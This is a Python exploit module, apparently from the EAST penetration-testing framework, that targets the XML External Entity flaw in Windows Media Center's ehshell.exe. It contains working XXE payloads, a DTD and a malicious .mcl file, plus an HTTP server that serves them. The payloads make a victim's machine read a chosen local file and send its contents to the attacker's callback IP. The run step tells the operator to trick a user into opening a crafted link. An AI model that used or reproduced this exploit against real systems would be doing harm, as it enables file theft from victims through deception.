#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import time
import urllib
import thread

sys.path.append('./core')
from Sploit import Sploit
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer

INFO = {}
INFO['NAME'] = "efa_microsoft_windows_media_center_xxe"
INFO['DESCRIPTION'] = "Microsoft Windows Media Center 6.1.7600 - 'ehshell.exe' XML External Entity Injection"
INFO['VENDOR'] = "https://www.microsoft.com"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/40861/']
INFO["CVE Name"] = ""
INFO["NOTES"] = """Windows Media Center "ehshell.exe" is vulnerable to XML External Entity attack allowing remote access to ANY files on a victims computer, if they
open an XXE laden ".mcl" file via a remote share / USB or from an malicious "windowsmediacenterweb" web link.
 
Sometimes 'Windows Media Center' will crash, sometimes opens normally and
other times will not open, but the files get accessed and exfiltrated.

Tested Windows 7 SP1
"""

INFO['CHANGELOG'] = "05 Dec, 2016. Written by Gleg team."
INFO['PATH'] = 'Exploits/General/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["CALLBACK_IP"] = "192.168.1.49", dict(description = 'Server IP')
OPTIONS["PATH"] = "C:/windows/win.ini", dict(description = 'File path')

DTD = '''<!ENTITY % param666 "<!ENTITY &#x25; evil SYSTEM '
http://{}:8080/%data666;'>">'''
MCL = '''<?xml version="1.0"?>
<!DOCTYPE hyp3rlinx [
<!ENTITY % data666 SYSTEM "{}">
<!ENTITY % junk SYSTEM "http://{}:8080/evil.dtd">
%junk;
%param666;
%evil;
]>'''
LOG = None

class MyHandler(BaseHTTPRequestHandler):
        
    def do_GET(self):
        try:
            self.send_response(200)
            self.send_header('Server','EaST')
            if self.path.endswith('.dtd'):
                self.send_header('Content-Type', 'text/xml')
                self.send_header('Content-length', len(DTD))
                self.end_headers()
                
                self.wfile.write(DTD)
            else:
                self.send_header('Content-Type', 'text/mcl')
                self.send_header('Content-length', len(MCL))
                self.end_headers()
                
                self.wfile.write(MCL)
        except Exception as e:
            print e
            print 'Error'
            
    def log_message(self, format, *args):
        LOG(urllib.unquote(args[0]))

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        self.callback_ip = ''
        self.path = ''
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.callback_ip = self.args.get('CALLBACK_IP', OPTIONS["CALLBACK_IP"])
        self.path = self.args.get('PATH', OPTIONS["PATH"])
        return
    
    def run(self):
        self.args()
        
        global MCL
        global DTD
        global LOG
        LOG = self.log
        DTD = DTD.format(self.callback_ip)
        MCL = MCL.format(self.path, self.callback_ip)
        
        self.log('Starting server')
        serv = HTTPServer(('', 8080), MyHandler)
        thread.start_new_thread(serv.serve_forever, ())
        self.log("Trick user to open windowsmediacenterweb://{}:8080/Media.mcl".format(self.callback_ip))
        self.log('Wait 120 seconds')
        
        time.sleep(120)
        self.finish(True)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
